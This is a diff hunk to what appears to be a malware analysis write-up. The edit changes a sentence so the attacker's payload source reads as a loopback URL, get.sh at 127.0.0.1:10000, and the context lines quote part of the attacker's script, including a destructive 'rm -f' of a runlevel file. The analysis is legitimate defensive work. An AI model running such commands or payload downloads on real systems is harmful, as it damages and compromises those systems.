@@ -107,7 +107,7 @@ rm -f /etc/runlevels/default/console
 exit
 ```
 
-As we can see from the first few commands, the bad actor downloads and extracts a payload from `get.sh` and installs three malicious files, `c`, `a`, and `b`. 
+As we can see from the first few commands, the bad actor downloads and extracts a payload at `http://127.0.0.1:10000/a/get.sh` and installs three malicious files, `c`, `a`, and `b`. 
 
 ```
 cd /tmp
